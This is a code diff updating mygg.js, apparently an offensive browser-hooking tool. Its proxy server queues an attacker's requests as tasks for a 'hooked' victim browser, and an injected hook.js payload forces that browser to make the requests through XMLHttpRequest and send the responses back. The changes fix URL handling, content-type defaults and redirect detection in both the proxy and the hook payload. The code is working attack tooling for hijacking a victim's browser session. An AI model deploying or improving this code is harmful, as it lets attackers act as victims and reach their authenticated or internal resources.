@@ -1,6 +1,6 @@
 /* --------- Info --------- */
 
-//  mygg.js v0.3.1 
+//  mygg.js v0.3.2
 //  Author: Daniel Solstad
 //  Repository: https://github.com/dsolstad/mygg.js
 
@@ -55,14 +55,14 @@ proxy.createServer(function (req, res) {
     }
 
     console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
-    console.log("[+] Requesting: " + req.method + " " + req.url);
+    console.log(`[+] Requesting: ${req.method} ${req.url}`);
     
     /* Get the full requested URL. */
-    var urlObj = new URL(req.url);
+    /*var urlObj = new URL(req.url);
     var url = urlObj.pathname;
     if (urlObj.searchParams != '') {
         url = url + '?' + urlObj.searchParams;
-    }
+    }*/
     
     /* Check if request from proxy/attacker contains a body. */
     if (req.headers['content-length'] > 0) {
@@ -74,7 +74,7 @@ proxy.createServer(function (req, res) {
             /* Sends a task to the hooked browser. */
             var buffer = Buffer.concat(data);
             var body = buffer.toString('utf8');
-            var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": body}
+            var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": body}
             tasks_pending.push(new_task);
             
             /* Handles the response from the task given to the hooked browser. */
@@ -82,9 +82,8 @@ proxy.createServer(function (req, res) {
                 var headers = result.headers;
                 var headers = str2json(headers);
                 var headers = stripHeaders(headers);
-                
-                var content_type = headers['content-type'];
-                
+                var content_type = (headers['content-type']? headers['content-type'] : 'plain/text');
+
                 /* If the received content type is binary, we need to present it as such.
                    If is it text, we need to process it before being displayed in the attacking browser. */
                 if (content_type.match(/image|octet-stream/)) {
@@ -109,18 +108,16 @@ proxy.createServer(function (req, res) {
         });
     } else {
         /* Sends a task to the hooked browser. */
-        var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": null}
+        var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": null}
         tasks_pending.push(new_task);
     
         /* Handles the response from the task given to the hooked browser. */
         task_callbacks[new_task.id] = function (result) {
             var headers = result.headers;
-	    if (headers) {
-                var headers = str2json(headers);
-                var headers = stripHeaders(headers);
-	    }
-            var content_type = headers['content-type'];
-            
+            var headers = str2json(headers);
+            var headers = stripHeaders(headers);
+            var content_type = (headers['content-type']? headers['content-type'] : 'plain/text');
+
             /* If the received content type is binary, we need to present it as such.
                If is it text, we need to process it before being displayed in the attacking browser. */
             if (content_type.match(/image|octet-stream/)) {
@@ -253,7 +250,7 @@ function stripHeaders(headers) {
 
 /* Strips complete URLs with hook.js to "javascript", which will be ignored. */
 function stripHooks(body) {
-    return body.replace(/https?:\/\/[^\/]*?\/hook\.js/g, 'javascript:#');
+    return body.replace(/src=["']https?:\/\/[^\/]*?\/hook\.js/g, "src='javascript:#");
 }
 
 /* Convert links in the body from https to http. */
@@ -292,7 +289,7 @@ console.log("[+] Payload stager:\r\n" + hook + "\r\n");
 
 var hook_file = `
 function makeRequest(id, method, url, head, body) {
-    /* Forcing the "victim" browser to perform the request. */
+    /* Forcing the hooked browser to perform the request. */
     var target_http = new XMLHttpRequest();
     target_http.responseType = 'blob';
     target_http.onreadystatechange = function() {
@@ -305,7 +302,7 @@ function makeRequest(id, method, url, head, body) {
             formData.append('url', url);
 
             /* Checking if the browser got a redirect. */
-            if (url == getPath(target_http.responseURL)) {
+            if (stripProt(url) == stripProt(target_http.responseURL)) {
                 formData.append('status', target_http.status);
                 formData.append('headers', target_http.getAllResponseHeaders());
                 var blob = new Blob([target_http.response], {type: 'application/octet-stream'});
@@ -330,6 +327,9 @@ function makeRequest(id, method, url, head, body) {
     } else {
         target_http.send();
     }
+}
+function stripProt(url) {
+    return url.split('://').splice(1).join('/');
 }
 function getPath(url) {
     return '/' + url.split('/').splice(3).join('/');
